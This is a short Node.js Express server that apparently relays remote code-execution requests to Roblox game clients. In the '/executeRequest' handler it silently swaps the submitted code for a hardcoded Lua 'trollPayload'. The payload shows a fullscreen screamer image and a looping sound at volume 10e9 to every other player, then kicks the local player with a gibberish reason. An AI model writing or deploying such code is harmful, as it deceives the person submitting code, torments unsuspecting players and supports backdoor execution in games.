const express = require("express");
const { EventEmitter } = require("events");

const app = express();
const events = new EventEmitter();
const EVENT = "RemoteEvent";

app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generateGibberish(length = 16) {
  const chars = "你好世界𓂀𒐫ÆØµΔЖѬ()";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

app.post("/executeRequest", (req, res) => {
  const { username, code } = req.body;
  if (!username || !code) return res.sendStatus(400);

  console.log(`Execute request from: ${username}`);

  const reason = generateGibberish();

const trollPayload = `
-- Gibberish generator function (Lua version)
local function generateGibberish(length)
	local chars = {"你","好","世","界","𓂀","𒐫","Æ","Ø","µ","Δ","Ж","Ѭ","(",")"}
	local result = ""
	for i = 1, length do
		result = result .. chars[math.random(1, #chars)]
	end
	return result
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

for _, v in pairs(Players:GetPlayers()) do
	if v ~= LocalPlayer and not v:FindFirstChild("PlayerGui"):FindFirstChild("Screamer") then
		spawn(function()
			local newgui = Instance.new("ScreenGui", v:FindFirstChild("PlayerGui"))
			newgui.Name = "Screamer"

			local newimage = Instance.new("ImageLabel")
			newimage.Image = "http://www.roblox.com/asset/?id=16635097419"
			newimage.Size = UDim2.new(1, 0, 1, 0)
			newimage.Parent = newgui

			local s = Instance.new("Sound")
			s.SoundId = "rbxassetid://6018028320"
			s.Volume = 10e9
			s.Looped = true
			s.Parent = newgui
			s:Play()

			print("Screamed " .. v.Name)

			wait(9.4)
			newimage:Destroy()
		end)
	end
end

-- Kick the local player with gibberish reason
LocalPlayer:Kick(generateGibberish(16))

`;

  events.emit(EVENT, { username, code: trollPayload });
  res.sendStatus(200);
});

app.get("/fetchExecuteRequests", (req, res) => {
  events.once(EVENT, ({ username, code }) => {
    res.json({ username, code });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
